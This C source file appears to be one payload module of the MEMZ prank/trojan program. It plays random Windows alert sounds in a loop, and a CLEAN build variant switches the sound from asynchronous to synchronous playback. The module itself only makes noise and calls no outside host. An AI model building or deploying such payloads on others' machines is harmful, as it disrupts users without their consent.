#include "../MEMZ.h"

const char *sounds[] = {
	"SystemHand",
	"SystemQuestion",
	"SystemExclamation"
};

PAYLOADFUNCTIONDEFAULT(payloadWindowsSounds) {
	PAYLOADHEAD

	// There seems to be a bug where toggling ALL payloads kills the sound output on some systems.
	// I don't know why this happens, but using SND_SYNC seems to fix the bug.
	// But the sound is not not as fast as before. I hope there is another way to fix it without slowing down the payload.
	// As this only happens for the enable-disable part, I will only include that in the clean build as a workaround.
#ifdef CLEAN
	PlaySoundA(sounds[random() % (sizeof(sounds)/sizeof(sounds[0]))], GetModuleHandle(NULL), SND_SYNC);
	out: return random() % 10;
#else
	PlaySoundA(sounds[random() % (sizeof(sounds)/sizeof(sounds[0]))], GetModuleHandle(NULL), SND_ASYNC);
	out: return 20 + (random() % 20);
#endif
}